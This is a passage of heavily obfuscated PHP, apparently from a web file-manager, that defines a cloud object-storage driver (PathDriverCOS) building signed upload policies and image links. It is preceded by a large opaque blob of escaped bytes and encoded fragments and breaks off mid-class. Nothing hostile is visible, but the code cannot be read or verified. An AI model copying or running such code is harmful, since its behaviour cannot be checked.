\167\74"."\362\306\326\35\157\77\170\311\336\235\367\141\55\334\357\334\102\225\162\247\56\73\153\372\232\73\246\56\273\150\357\75\347\114\337\177\371\364\15\147\277\161\335\345\177\76\343\54\130\23\5\342\6\77\120".base64_decode('ypQFKGiR6RsfnHrwsjeuvm7vzp1SfhsrmeekRYHmZ+q8c984+9apy67Yc/V3KgrQBtwziId3zQ==')."\5\173\266\237\43\245\270\13\265\222\347\201\304\246\301\313\320\204\251\313\267\354\371\301\35\356\102\364\275\250\52\205\246\257\75\377\365\7\356\165\25\352\66\343\345\124\266\125\172\207\150\372\222\363\247"."\166\154\347\215\274\276\153\13\65\135\163\25\341\152\345\74\77\255\277\62\177\234\341\152\233\251\133\210\353\357\302\74\45\115\332\163\373\303\250\77\24\142\362\314\115\355\74\157\317\215\147\356\271\375\102"."\x98\x89\x6d\x3b\xa7\x2e\xff\xfe\xf4\xed\x37\xef\xb9\x69\x7\xaf\x16\xb0\xca\x61\xef\x82\x2b\xb8\xf3\xac\xbd\xf7\x9e\x3b\xbd\xf5\x5e\x9e\x11\x2f\xe6\xb4\x22\xf2\x10\x8c\xa2\x79\xb0\x99\x1e\x69\x70\xcf\x43\x57\xec\x79\xe0"."\x7a\x8c\x24\x17\x9d\xb5\xe7\xac\x9f\x4c\x5d\x7f\xc7\xd4\xd\x67\xf0\x66\xa7\x76\xed\x12\x50\x8e\xfa\xc9\x2b\xb7\x55\xc8\xe8\xc9\x38\x1e\x8\xe9\xa0\x30\x9a\x28\x96\xa5\x87\x96\x65\xd2\x85\xf\xd8\xdc\x2e\x2\xb3\xaa\xf4".base64_decode('aS92bka7crlUaDXTAOjTahAFrGmumV2HfutrPDVYOEXCmAbiCNJoTfPsOvJRDy4jJ4H8S+92AA==').base64_decode('x7kK0QBJbWcV2UPwDtXkb/KzXWvVCG5HPPTayzcLcYCn2wZ9c4/p/XTr9phZko2DmhrARjorEQ==')."\375\274\5\344\233\276\205\45\56\115\0\273\250\46\375\345\133\52\361\12\12\44\251\371\215\43\373\175\167\115\235\373\343\67\266\336\356\316\113\245\362\220\27\237\0\52\36\377\246\346\233\123\127\154\253"."\154\217\344\167\266\306\62\117\235\171\375\236\253\135\71\231\375\211\42\135\277\210\2\4\301\135\244\202\23\165\271\10\105\351\377\57\13\205\262\326\315\370\276\230\106\254\367\366\26\47\312\5\57\346\170"."\275\161\331\175\271\353\65\313\6\147\176\174\301\341\314\57\157\366\51\261\151\346\305\47\175\145\263\131\221\237\310\225\36\245\41\227\147\164\127\142\247\66\210\303\174\0\213\62\234\346\110\142\153\127\235"."\x5b\xfb\x6a\x57\x7f\xb1\x42\xa6\x37\x8e\x16\x87\x8e\x1f\xaa\x45\xbb\x97\xf4\xbc\x94\x9c\xc5\xf9\xa8\xaa\xfb\xa9\x55\x37\x14\x48\x11\x7c\xdb\xe6\x95\x9f\x79\x1d\xf7\x96\x49\x32\x7e\x92\xcf\x8b\xef\xee\xbc\x46\x7a\xa6\x14".strrev('!¶Å¾UªZBwc÷rònt:5ãŸ^ad±øT­V'."\r".'f\\·©â‰&îÒ6[ÒËUx5vªA')."\237\126\232\26\64\57\132\326\314\234\304\314\145\172\263\345\42\263\251\103\237\354\255\266\23\374\203\214\326\210\107\122\331\330\360\204\113\57\10\72\242\5\30\371\313\154\214\110\71\362\211\336\72\236\370"."\205\201\322\333\0\351\311\103\242\102\100\111\24\326\46\127\271\110\240\312\41\333\140\317\176\112\17\107\360\171\310\260\217\22\227\311\152\142\145\44\163\303\142\0\204\254\0\142\243\263\226\141\212\123\16"."\xe1\x2f\x25\x82\x40\x64\x3c\x2d\x52\xa2\x62\x9b\xa6\x92\xd7\xa\x13\x20\x30\x9c\x63\x35\xcf\xb1\x96\xe3\x86\x5a\xb0\xbd\xa4\xc5\x35\xa4\xf0\xde\x23\x1c\xb3\xdb\x92\xb0\x3\xb4\x23\x7c\xf8\x91\x5f\x7c\x5a\x34\x63\x65\xc8"."\xd5\x43\x68\x3a\x6c\x64\xf4\x4d\x55\x48\x88\xf4\x76\x84\xbb\x25\xd\x77\x29\x42\xd\xb6\x75\xab\x81\x9e\x9e\xaa\x9\x0\x76\x7a\x53\x89\xdf\xfa\xf4\xd\x49\xef\xba\xd3\xaf\x15\xe8\xdc\xa4\xa4\xb0\xd5\x6e\x4b\xd\x8e\xad"."\x51\xac\x52\xaa\xa5\x86\x26\xd6\xf8\x41\x61\x9a\x64\x10\x8c\xce\xa\x3\x8a\xd4\xe2\x22\xca\x20\xc2\x9\x2f\xf9\xa2\xc9\xb5\x2b\x57\xf8\xd\x28\xe9\xf3\x9f\x88\x69\xb4\x1f\xab\x8a\x17\xe6\xe2\xa9\x63\xa6\xa2\x16\xb1\x5d"."\105\261\355\302\271\251\242\254\320\24\12\256\226\132\162\357\136\253\144\321\126\315\355\144\126\272\13\363\127\171\127\370\65\71\21\257\226\230\311\16\167\134\300\45\311\36\253\351\131\4\244\247\235\310\263"."\x98\x41\xad\xb0\xb6\xb2\x8\xae\xdc\x97\x92\x93\xd8\xeb\xea\x59\x22\xfc\x75\xe9\xf5\xac\x28\xae\x5c\x81\xf\xf1\x4c\x19\xdd\x4f\x2\x2b\xfc\xc5\x95\xf2\x6c\x13\xe1\x5b\x65\x63\x20\x76\x10\xc2\x66\x95\x4a\x6b\xaa\xab\xb6"."\xf4\x80\xac\x4a\xd6\x2\x71\xe6\xe0\xda\x1e\x55\x30\xd\x2b\x95\xa2\xe5\xc1\xf4\x5\xb5\xd4\x30\x46\x55\xb1\x89\x40\x47\x21\xa1\x7\xb\x1a\x68\x82\xe3\x4d\x3c\x5b\xd2\x14\x2e\x63\x67\x9\x44\x8d\xa0\x24\x9e\x14\x3e\xed"."\64\132\21\176\357\161\363\346\312\70\260\57\162\47\5\212\206\73\12\243\244\73\16\203\100\304\241\335\320\331\14\135\16\162\46\21\303\362\320\137\121\46\322\335\41\2\364\250\356\110\354\143\72\301\44"."\xd4\xdf\x57\xeb\x9b\xb7\x79\xb3\xdf\x60\x5a\xf8\x4c\xf7\x97\x95\xf5\xf1\xdc\x34\xdc\xef\x73\xe6\x47\x23\x1\xd0\xf3\x8c\x10\xe1\xce\x49\xd1\xee\x24\xc0\xb3\x59\xfe\x79\xc2\x9d\x2\xd7\xb6\x57\xb0\xa\x7e\x4b\xcb\xca\x3e".base64_decode('zoANsDSVyEnkuWNsq9G4lCEFOkQm1vHPYLfgwjkXatgRjemn89VH6ZmPyL8DzudXVomnmCnw5Q==')."\357\100\261\350\40\134\54\200\25\55\162\106\322\317\251\15\125\276\360\245\204\267\2\226\205\320\72\127\74\326\250\167\45\340\67\214\110\364\50\42\306\146\211\123\107\36\217\352\342\221\60\130\114\301\44".strrev('ueaCR×:V!­À®òdŒ) %jØÔµÑjY£Tm!ŞÕä57!SÔ´Q’©XW“Å‚')."\x1d\x95\x27\x14\xb1\x5a\x23\xa8\x60\x8d\xc2\x68\x76\x5e\xe3\x70\x2c\xd9\x26\xda\x7b\xb9\x61\x3b\xbc\x99\xde\x1b\x3\xb\xde\x40\x37\xa8\xbc\x9c\x78\x2a\xfd\x9d\x7d\x22\x43\x2f\xf2\xa0\x7b\xe\xf1\xd8\xc4\x3e\x91\x50\x47".strrev('1#"Ü'."\n".'*PØüFç,¡ÚçO³£ˆ>ıE‰C²ãG/yØğ{ ÑE‰ïnŞ	š6ëâÈÂ').strrev('¶f1³KP›Ô}}§®ïö:ÃÉh‚Çlì	×íô#ÌHJ¦. :cO¥t†`zz9Z#éÿª[Eß')."\x19\xc2\x99\x1\xcb\x29\xa7\x28\x78\x3\x1a\xe0\x50\x47\x44\xc1\xf\x34\x55\x2c\xb7\x5a\xac\x51\x2\x6f\x91\xd6\x7a\x6a\xeb\x7c\xf3\xea\x6b\x2b\x53\xa8\xa5\x8b\x33\x1d\x5b\xb8\xab\x27\xc5\x51\x22\x3c\xf8\x9\x8c\x4\xf1".base64_decode('AhCMhEPdCTUMPERj0xJfg7DQNyzxYgH9DnId2ZJOoOpzDKsKaOjdeoLbcOgFh9iVgjRnMl/6TQ==')."\15\15\15\336\206\106\364\77\63\74\144\36\274\233\33\32\52\262\64\64\64\223\377\151\2\271\337\6\24\164\246\20\117\123\120\37\375\31\323\165\350\20\154\271\350\144\135\146\374\153\137\20\373\136\120"."\160\327\140\132\204\15\12\302\76\342\342\236\321\132\307\163\362\12\271\277\204\120\136\172\367\74\16\357\40\144\34\50\56\137\222\261\157\304\120\42\344\46\120\201\16\363\273\54\224\115\54\233\345\364\236".strrev('zÊ'."\0".'ô±Å‡$„q†|RšbqóœùBFºN”¢!ìü¯²ò^)]>cr}Ò	A8E').base64_decode('JJnfFpFQjrsxw8FuXhN9UZM+HQdwq7L0suaYKrgUHDyJhwgY8RbFcC8tuS3BsGQbkZSdq1ALNQ==')."\123\140\360\210\253\255\141\103\132\1\150\2\124\251\250\14\317\345\70\43\33\111\302\131\22\65\341\305\35\365\342\176\67\13\50\42\102\26\340\157\215\122\133\37\326\137\5\110\13\15\222\207\206\102\370"."\271\153\152\360\325\74\253\142\222\155\367\4\223\171\163\134\145\270\165\331\131\110\232\75\246\321\20\377\14\165\163\26\23\142\21\124\27\43\310\75\350\113\25\270\223\134\145\2\124\21\242\242\0\304\127"."\xe6\x26\xfa\x22\x55\x72\xe3\x78\x57\x6e\xe2\x2b\x3f\xc8\x9f\x4\x91\x1d\xe8\x53\x99\x95\xa4\xbd\x6c\xc1\x9b\x6b\x42\x75\x94\xd5\x31\x2a\x9d\x60\x7d\xc5\x92\x99\x41\x98\x60\xc9\x40\x43\xf1\x3d\xd5\xa3\x79\xf6\xca\x9c\x55".base64_decode('MvHey/nkSHyn2e5QbJY8A2lpvktKWSWNBhHpXOFSQpA/CSxH4qOxrD5BTiXOOvCZ2xnDe/YpSA==')."\xc7\x44\x24\x76\x49\x2b\x58\x83\xb2\x9a\xa3\x2b\x1b\xe1\x7b\x80\x2a\x32\x75\x38\x96\x45\x10\x2f\x2c\xe1\x92\x1f\x74\xd7\xd2\xe9\x1e\xe1\x4f\x4b\x75\xe0\xd5\x4c\x28\xc8\x16\xa0\xa4\x3d\xe2\xc6\x47\x4e\x53\xc8\x6a\xe3\xde"."\xba\x98\x5a\x34\x9e\x1c\xa1\x55\xe8\x8c\xa7\x71\x54\x7e\xe2\xd0\x34\x4a\x10\xba\x9b\xd3\x13\x0\x9\x36\x56\xdc\x2\xae\x80\xa8\x8f\xbb\xe6\x53\xac\xc1\x66\xc6\xf\xc9\xc5\x9c\x69\x18\xad\x13\xa6\x43\x83\x71\xf7\x79\x57"."\xb0\x8f\xab\xe8\x7\x43\x44\xe6\xd6\x89\xcc\x39\xf3\x35\xa4\xca\x37\x80\x18\x3c\xaa\x2c\xfc\x12\xf\x8d\xa\xf2\xd3\x69\xdb\x45\x67\xc5\xd2\xf2\x70\xae\x8c\x8a\x25\x40\xb8\xd\x5c\x41\x33\xa7\xa1\x52\x8\xd7\xce\x2e\x63"."\xb5\x52\x6\x9c\xe2\x79\x70\xb4\x62\x92\x9b\x1a\xa5\xa0\x73\xe7\x51\x4e\xc\x94\xb\xc0\x2b\xc2\x26\xe2\x79\xf1\xdb\x21\x72\x21\x5c\x57\xaf\x8b\x9e\xae\xe1\x24\x1d\x87\x78\x5f\x29\xc3\xc9\x2c\x3f\x94\x39\xbe\x26\xd0\x96".strrev(',‰ñ®E@vO“¶Á™ÑxCXcİkÌ${”tÖ4ØÈ1ÿ|(.;óıPŠ£Ğ^Ãš')."\226\162\15\50\244\357\313\311\223\150\125\122\261\367\56\326\32\177\134\5\366\56\224\307\264\371\361\37\127\217\326\210\10\104\144\126\35\107\264\351\374\241\257\4\255\301\273\122\364\174\271\306\73\55\153"."\xc1\x49\x2a\x1c\xbc\x10\xea\x1f\x77\x3c\x36\x69\x14\xc9\x7b\x5a\x92\x80\xc2\x15\x74\x9b\xa9\xe0\x12\x92\xde\x19\xa\x4a\xec\x5\x61\x6e\x6c\xc6\x9f\xb0\xd7\xb4\x84\x79\x7\xf9\x14\x3b\xca\xee\x6d\xe7\xb1\x8f\x73\x5\xae"."\311\204\244\112\377\240\126\136\47\356\101\101\130\227\0\147\126\322\123\146\51\215\167\170\311\305\136\301\216\351\31\71\110\124\56\330\212\21\57\361\310\125\140\77\255\22\221\304\53\67\220\262\313\262\327"."\127\351\261\56\24\222\224\213\45\26\333\333\250\160\336\134\245\65\323\300\174\51\201\344\257\306\246\273\104\327\104\160\100\325\156\210\144\57\136\116\362\33\164\27\357\314\254\343\25\231\153\146\246\360\270"."\2\342\266\22\217\300\222\323\120\265\370\221\34\61\62\271\10\151\263\242\10\115\303\234\242\260\231\227\123\54\254\74\324\313\146\261\132\112\225\246\110\222\4\321\24\303\64\240\4\33\4\220\40\141\102"."\x67\xca\x68\xde\xc6\x26\xef\x2\x38\x9b\xc9\x76\xf4\xec\xd8\x9\xbb\x1e\x5a\x67\x12\x1a\xe0\x83\x3b\x23\x75\x60\x55\x4\xf9\x44\x1e\x53\x52\x4a\x20\x8e\x20\x85\xcf\x3a\xe2\xfd\x92\xcf\x27\x71\x93\xc9\x43\x44\x63\x50\x26"."\372\102\211\226\232\34\271\365\54\171\72\205\5\116\156\163\30\211\271\62\240\225\340\114\207\27\326\4\117\106\135\122\72\367\61\127\45\360\22\240\254\63\106\112\11\5\124\141\76\207\242\114\252\11\51"."\100\40\364\42\261\340\225\223\64\21\235\60\171\144\245\26\61\106\72\0\45\365\31\4\107\365\272\172\354\63\310\41\73\355\232\340\236\135\260\206\76\336\73\271\75\230\45\7\130\52\307\75\313\21\240"."\x26\xf\x8e\xd2\x3c\x8a\xe7\x1a\xd3\x93\xb0\xd3\x32\x11\x43\x4f\x67\x8f\x9f\x47\xb5\xf2\xd5\x47\x25\x3c\xc2\x4d\x70\x90\xa9\xfd\xeb\xe3\x3a\x1c\x4c\xc7\xf2\x46\x4a\x89\x44\x3b\xc2\xc1\x40\xa4\x2d\x1c\x5f\xa3\x64\xf0\xd".base64_decode('s9CGR91VyapULaFvRxcFkaZTsDPsTfIHAfGnN4mOOt40PyJa4jBIBgWViceendVS7NNLFTUWsA==')."\5\177\256\242\14\276\43\250\222\73\47\4\330\122\346\142\111\257\314\77\241\143\105\174\251\307\122\201\162\225\336\100\376\352\55\220\327\34\345\334\210\51\322\13\63\165\336\50\214\32\226\41\26\70\53"."\61\41\327\36\150\353\12\167\253\201\110\44\272\316\141\51\223\226\37\336\224\146\101\0\234\266\44\373\232\226\143\34\57\223\271\204\76\164\252\144\367\350\22\301\307\162\131\304\117\152\334\373\165\221\135"."\350\341\215\121\172\71\24\202\322\273\274\305\222\146\130\272\24\101\337\167\145\66\354\132\56\47\245\341\33\45\51\130\166\356\244\125\233\122\151\3\54\116\322\72\257\226\41\26\356\350\114\374\237\273\152"."\244\205\342\262\301\265\316\271\107\24\372\10\137\220\326\343\154\123\74\365\130\31\363\177\175\327\330\43\56\105\125\342\31\225\275\250\156\222\23\36\160\370\64\56\34\125\211\40\137\25\115\40\376\244\64"."\x51\x94\x2f\xa3\xfd\x69\x66\x99\x8f\x10\x3f\xc4\xac\x6b\x71\x40\x9c\x73\x70\x2e\xa8\x4\xb7\x42\xf\xde\x86\x49\x84\xa0\xec\x44\xc4\x4\x8a\x88\x82\x0\xc0\x1d\xaa\xa0\xae\x87\x99\xdd\x86\x63\x8e\x67\x97\x2b\xda\x20\xef"."\xec\xd1\xb4\x3e\x3c\xa\x94\x73\x40\x8c\x9\x85\xb8\x99\x95\x28\xea\x4e\xa9\xd2\x1\x94\xac\x8\x29\x1d\xcf\xa0\xb4\x28\xd\xf4\x9\x71\xae\xb9\xae\xac\x60\xbe\x9d\x44\x3\xc4\x45\x71\x28\x5f\xb4\x1d\x42\x89\x4e\xd9\xde"._kodDe('KJBKLAigQf+y/STHpSW2SAlEIU5UyhFFwjpKei4HbmHM2aTVgyKJkAJqKCN/LA/sIyWGESCW5/k=')."\206\156\127\76\350\113\213\377\277\51\110\23\343\222\107\176\313\275\5\362\355\313\141\326\106\64\260\263\346\230\20\27\260\30\211\321\142\246\164\325\272\67\303\120\245\165\105\174\27\311\357\52\73\254\355"."\x1c\x6f\x66\xd2\x4\xa5\x5c\xc0\xf7\x25\x88\x4\xc1\x8c\x63\x25\x25\x76\xb8\x25\x99\xa5\xbe\xcd\xa1\x3f\xfd\xf0\xcb\xf6\x42\x77\x27\x28\x75\x83\x26\xeb\x39\x2\x3a\xcd\x0\xa4\x88\x2e\x5d\xc8\x3e\x48\x29\x44\x4e\x8a\x5a".base64_decode('wfHCLOp7tUersSNz55uo4qlZsdk6n97keg6WWCyW7XjsNWEmtIyH4i4mfyLUOiF/yxZipOcokQ==')."\x89\x2d\x85\x17\x8a\x95\x2c\xc6\x43\x9e\x3b\xa7\x54\xcf\xfd\x42\xa9\xb4\xfa\x38\x71\x95\xad\x28\x33\xc4\xdf\x36\xa8\x39\xba\xdc\x83\x64\xc\x9d\x6d\x10\x8e\x6c\x34\xca\xaf\x15\x8b\xe2\x86\x46\xde\x57\xd1\xbf\xe\xf7\x23"."\x90\xd6\x9b\xe8\x54\x89\x13\x30\x95\x2a\x6b\xc4\xa5\xbd\x50\xdc\x9a\xd2\x48\xb8\x41\x2d\x17\xc2\xf4\xa6\xc8\x11\x5b\x92\xe\x7d\xf2\xb\x16\xf4\xf6\x48\xf8\xaa\x80\xec\xa8\x9f\x3d\xf4\xe\x19\x0\x26\x57\xc9\xee\xf5\xb9"."\340\37\121\33\176\66\366\127\352\1\140\365\71\240\43\130\135\211\351\211\15\233\344\154\345\223\117\145\220\101\131\241\10\164\220\27\31\65\177\110\247\351\63\360\204\76\310\144\215\55\113\327\273\257\25"."\371\330\333\365\325\336\303\245\46\30\344\247\115\37\344\207\34\331\173\241\120\51\162\277\362\316\52\346\26\160\36\72\72\17\137\43\364\301\372\152\117\325\173\370\353\265\36\352\61\337\3\317\326\173\304".strrev('K–¡¥ÈÄ4<à<p`#Ô-ä[ ™b8nb\\ä8Lq:qQhü3„'."\n".'´ğDQwp®°öŸô›')."\71\17\121\16\361\60\215\115\27\134\34\40\27\143\225\147\315\145\211\310\203\321\234\74\312\336\122\116\274\217\115\173\44\46\120\236\225\317\354\14\230\151\220\143\134\332\111\15\233\127\44\113\354\262\335"."\235\315\160\340\67\332\251\205\35\74\175\33\242\142\263\40\74\0\343\221\322\115\13\26\55\223\5\43\142\362\305\155\64\370\115\203\113\165\140\170\4\72\51\16\150\172\24\366\66\205\114\54\110\242\323".base64_decode('BIi9OyO2HNcm8X9aXNKJhGaVvQOStJKZwwfjPL4gsEua8/BX5YzDdlkCvqrvVEu7nqdiB6SMBQ==').base64_decode('QUMYD4coLOiCkRomzuNIC9QA0GPp4x4KMI98E04PN0K/DA+GY6xkOkjIutA5qzJcDCJxCCCdFA==')."\xc4\x87\x42\x95\xed\x58\x4e\xf5\x33\x5b\x4b\x62\x62\x9b\x30\x98\xc5\x16\xa1\xa\x92\xa6\x21\xb1\xaa\xe6\x55\x61\xd3\x4c\xc9\x5a\x94\x4d\x69\x35\x40\xba\x5a\xa3\x48\x6d\x62\x45\x2e\x4b\xa2\x8b\xce\x1a\xe8\xc\x54\x41\x10".strrev('åêäœ™—]¯õvkÁO„2¯Cj‰¹G‘%†0õló¥’%XA ç!,cgãjı\'7Ñ').strrev('¨n.J0‘ff.a#JR#uĞA|*™LÊ<ˆQ”J«¿‰ûÀ¾¢–g/lÕí€ùE£Î9s')."\x88\x9b\xf\xe1\xad\x90\x90\x1e\x7\x19\x92\x1e\xab\x91\xdd\x64\x90\x8a\x64\x5c\xad\xac\x9a\xee\xc3\x44\xa\x2f\xc4\x67\x44\xde\x6\x83\x0\xe2\x44\x54\x58\x88\x9b\x95\x40\x7\x77\xbd\xa2\x49\x6a\x9c\xaa\x7b\xb9\x63\x74".base64_decode('EJ22TflboAne/7gJJuqA4xSOwmLWJYqbdkUyKJE1xjtAWfh5wLzLfn4c5z7+qLvjHGgJuMDySQ==').base64_decode('exzPyKUFZwKEDQg/MVekrUlMh+AvxFd3OS8CkuCbHCp5osMdEnZI7FrAzMkSNtaXrzXp0yn0mw==')."\x9d\x76\x78\x97\x9\xed\xad\xb6\x1e\x85\xc9\xb6\x47\x98\x69\x7b\xd8\x86\xec\x99\x75\xf0\xc1\xc4\x29\x6\x2e\xc3\xe5\x1f\x55\xf6\x8\x2\x84\x4f\x61\xb9\x16\x35\xb0\x2b\xa\x6e\xec\x48\xa8\x2c\xb\x74\xc0\x41\x4\xba\x8d"."\157\270\71\361\246\162\162\327\200\234\54\303\301\200\134\150\26\174\243\202\214\220\60\67\1\140\336\251\231\323\152\215\335\51\42\176\335\175\115\135\161\164\23\76\145\114\63\227\324\112\330\16\176\330\146"."\252\125\325\2\156\117\34\161\155\120\227\373\334\107\344\330\50\222\30\112\17\10\32\202\343\252\25\23\24\212\154\101\105\211\6\222\272\120\214\124\13\127\367\204\314\136\316\206\130\122\307\252\110\104\330"."\151\103\62\373\206\35\334\5\11\242\57\355\174\74\111\342\334\52\262\211\356\43\6\217\253\154\263\257\24\346\52\210\63\72\230\6\331\13\120\264\310\116\340\365\260\137\14\254\146\364\217\70\51\3\62"."\50\223\76\107\124\5\301\114\70\46\327\21\51\317\233\240\161\76\247\143\104\50\201\157\272\133\245\143\55\315\144\311\260\165\134\237\124\152\305\124\226\346\224\105\56\202\115\70\234\222\103\346\75\301\333"."\340\165\105\64\172\135\325\31\26\275\240\161\55\32\271\63\324\302\12\313\261\142\130\162\304\44\205\344\256\215\134\314\173\53\313\110\146\376\362\345\175\305\22\255\116\61\170\247\204\264\24\177\311\360\140".base64_decode('lKenZBLWGXKV83XEONCZiQvXJDX5lCShdnNmNHqOTx6XfDntvPfCKpniyjcRjYXUdWHswCp8Sg==')."\xa8\x97\x3d\x22\x61\x98\xe4\xa9\x37\x56\x65\x6f\x97\xdc\x4f\x7c\x63\xd2\x6e\x72\xcc\xc2\x4b\x54\xbc\x7e\x60\xe7\x8b\x41\x7e\x29\xed\xb4\x60\x97\xc\xe\x98\x9b\x4f\x59\x68\xeb\xcc\x8c\x6d\x9e\x9c\xcb\x71\x65\xb5\x6c\x29"."\263\144\125\34\34\130\42\146\245\115\224\32\143\262\210\101\246\131\322\133\100\213\132\117\331\172\132\301\354\201\343\304\323\267\260\141\301\300\247\125\267\220\275\373\213\162\56\374\214\234\160\364\212\57\360".base64_decode('QvfDUeriLhYCuQ4vVLUik7rpq5aGEDduOzBMvCvofk/Q+X5gsyRepu8tOh4erZi1bjMo+BpXGg==').strrev('¤ö­:êœ+»åŠZ"ivCE<®ËÈEĞ°‚4Ê¼Ô·X\'ãêlP°º^Ç“¸€1b§3¦').base64_decode('8uS4RQVjDvkYaFfIUdLlEzq1pp1vy5JEEs1eNYEapPtyp7oCt3mu2H/LRkRKJqWY53z0i50yhA==')."\205\17\107\222\114\157\10\3\356\143\244\124\252\327\41\21\220\224\33\122\204\222\204\52\157\265\305\145\273\304\324\262\142\130\244\40\30\13\127\274\104\210\305\126\251\215\12\246\134\234\330\322\351\166\155"."\264\112\326\164\305\231\22\305\360\254\204\251\227\74\150\11\303\54\175\114\156\35\362\11\103\50\107\306\312\130\341\141\113\52\357\72\213\223\141\342\270\152\303\47\224\320\131\134\366\340\305\221\112\104\321"."\27\66\271\46\220\44\350\300\232\123\102\105\210\16\205\113\330\104\223\116\177\141\74\33\237\63\224\207\230\150\172\35\261\256\243\72\26\146\62\76\324\225\4\342\75\251\372\252\122\100\11\5\364\134\104"."\252\116\126\170\230\261\100\274\172\43\2\53\235\40\226\144\273\42\201\161\72\246\3\370\322\336\306\7\6\71\143\162\242\243\73\125\120\203\35\115\144\11\162\145\242\231\313\341\153\355\31\222\251\156\266"."\xb4\x13\x57\xe6\x10\x12\x3d\xda\x21\x72\xdc\x16\xb\x87\x46\xe6\x89\x78\x8a\xa6\x5\x9c\x49\x34\xbf\xee\x82\x9b\x5c\xc0\xd\x53\x5a\xc2\xf1\xa0\xb5\x1c\x3f\x66\xd8\xa9\xac\x24\x1b\xa8\x4c\xac\x8c\x2f\x55\x4c\x33\x74\xa0".strrev('%^f¶V¶r’¸'."\n".'áY’+eÂM,¸”s,qIp“F-UĞÊU˜JÓRGôT•„Öì³e½Ü8ú')."\xf0\x40\xec\x99\xae\x32\x60\x21\x4e\x94\xb2\xce\x4\xcf\xaa\x99\x2b\x9b\x83\x35\xe0\xce\x4d\x84\x6b\xd5\x7b\x21\x49\x1f\x9d\x6a\x34\xd5\x7a\x51\x35\xf3\x8c\xbd\x70\xe7\x16\x7c\x10\x3e\x84\x57\x4b\xa9\xba\x40\x41\x65\xa4".base64_decode('yo7BUqrsEZT+zaiMJnS1KjcrkVZFXQz8hLkckFVJlnXPqmunxarSN8upQeaKdzxfQEkSDZT0EQ==')."\331\230\231\53\120\212\232\20\303\230\63\206\205\246\56\63\71\232\343\330\336\312\205\341\202\311\267\314\264\320\316\346\35\251\250\300\271\16\12\145\351\365\236\252\106\117\36\54\66\253\24\111\345\330\263".base64_decode('FLK5GD3xm7aRktRXhckLH5khjsA5IdN23zwIIZ5D86mamB5H0U+fuJaj9Uk8mkAQh1Ei5Yzgwg==')."\222\352\74\4\261\302\15\277\353\46\367\16\224\223\240\311\161\263\144\173\250\176\176\221\374\266\232\266\55\124\205\330\55\10\72\7\140\166\300\43\151\304\241\57\161\311\215\73\105\356\112\11\16\323\173"."\xc\xfc\x9\xda\x17\x58\xee\x14\xd7\x69\x2a\x21\x7a\x8e\x0\xbe\x95\xe5\x81\x58\xe5\xa5\x6c\x3b\x7f\x3f\x65\xd8\x4c\x27\xcd\x71\xe6\x16\x1a\x61\x8e\x4\x13\xc9\x13\x26\x78\x8f\x94\x74\xf6\x88\x1b\x1c\xcb\x4f\x53\xfc\xf0".base64_decode('jqSX3KB4wVHxUDHjKE5f9+Z69p9WA9weiCroI3JEWgyGkPFEvCKpJxCPr4vG2uibcxXJpJSkDA==').base64_decode('WZHU0xntnikt1BUIRyrSsN5ktyp8i9OkcA/pJVEnmKkX4eAa0RN2kRmBx8nFJEi3ecWsWZhpHg==')."\131\5\161\215\171\157\224\57\266\364\274\160\110\57\52\161\12\335\344\313\57\213\75\167\303\77\234\17\105\273\224\224\235\312\71\14\163\241\132\254\37\331\15\55\305\212\20\213\37\356\343\4\200\237\47"."\204\232\216\317\241\41\44\305\223\105\102\250\216\264\166\345\335\235\334\4\163\131\34\111\236\127\25\232\125\156\45\145\5\50\234\52\200\203\273\171\22\173\171\147\310\114\212\43\34\234\355\300\361\1\200"."\133\322\210\245\337\216\144\133\313\60\121\251\103\367\205\112\320\61\121\20\262\355\377\7\346\14\213\210\340\305\0\0", 10, -8))); goto d·²šÆ¦ĞŞ; CÏÕï‹·‚«: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($—£ãğ³¶) { parent::__construct($—£ãğ³¶); $this->setSignVersion($_SERVER[Ï×Œõ”û][249]); } public function uploadFormData($³ù¼Ş¥Ã, $ŒˆÂûî° = 3600) { $ÊŸÜ¨É€ =& $_SERVER[Ï×Œõ”û]; $‚¼™ĞĞ = $ÊŸÜ¨É€[231]; $è½ÑÄÅğ = $ÊŸÜ¨É€[1478]; $™¸¹êú = $ÊŸÜ¨É€[263]; $üÌßú = gmdate($ÊŸÜ¨É€[1479], time() + $ŒˆÂûî°); $ÔÃ“İÑ„ = (string) time() . $ÊŸÜ¨É€[74] . (string) (time() + $ŒˆÂûî°); $Àğå¤Íâ = array($ÊŸÜ¨É€[264] => $üÌßú, $ÊŸÜ¨É€[267] => array(array($ÊŸÜ¨É€[308] => $‚¼™ĞĞ), array($ÊŸÜ¨É€[268] => $this->bucket), array($ÊŸÜ¨É€[269], $ÊŸÜ¨É€[270], $ÊŸÜ¨É€[12]), array($ÊŸÜ¨É€[272] => $™¸¹êú), array($ÊŸÜ¨É€[1480] => $è½ÑÄÅğ), array($ÊŸÜ¨É€[1481] => $this->accessKey), array($ÊŸÜ¨É€[1482] => $ÔÃ“İÑ„))); $Àğå¤Íâ = json_encode($Àğå¤Íâ); $¶Í†Ë¡¯ = hash_hmac($ÊŸÜ¨É€[1478], $ÔÃ“İÑ„, $this->secret); $™Ç¨Ô³˜ = sha1($Àğå¤Íâ); $³Ô¶¯’Á = hash_hmac($ÊŸÜ¨É€[1478], $™Ç¨Ô³˜, $¶Í†Ë¡¯); $–Ÿâ¤ = array($ÊŸÜ¨É€[308] => $‚¼™ĞĞ, $ÊŸÜ¨É€[272] => $™¸¹êú, $ÊŸÜ¨É€[279] => base64_encode($Àğå¤Íâ), $ÊŸÜ¨É€[1480] => $è½ÑÄÅğ, $ÊŸÜ¨É€[1481] => $this->accessKey, $ÊŸÜ¨É€[1483] => $ÔÃ“İÑ„, $ÊŸÜ¨É€[1484] => $³Ô¶¯’Á, $ÊŸÜ¨É€[208] => $this->getHost()); return $–Ÿâ¤; } public function fileOutImage($ŠÜ§Æ¸», $‹É¯äãÏ = 250) { $İ‰–Š˜ª =& $_SERVER[Ï×Œõ”û]; if ($this->size($ŠÜ§Æ¸») > 1024 * 1024 * 32) { return $this->fileOutImageServer($ŠÜ§Æ¸», $‹É¯äãÏ); } $ñ»Û¾„ú = $this->link($ŠÜ§Æ¸»); $ñ»Û¾„ú .= $İ‰–Š˜ª[1485] . $‹É¯äãÏ . $İ‰–Š˜ª[1486]; $this->fileOutLink($ñ»Û¾„ú); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($´ìµ«£) { $this->pathParse = $´ìµ«£; $this->model = Model($_SERVER[Ï×Œõ”û][1487]); } public function getPath($É‘¾‚ğÒ) { return trim($É‘¾‚ğÒ, $_SERVER[Ï×Œõ”û][8]); } public function pathFather($ë²´İŸ) 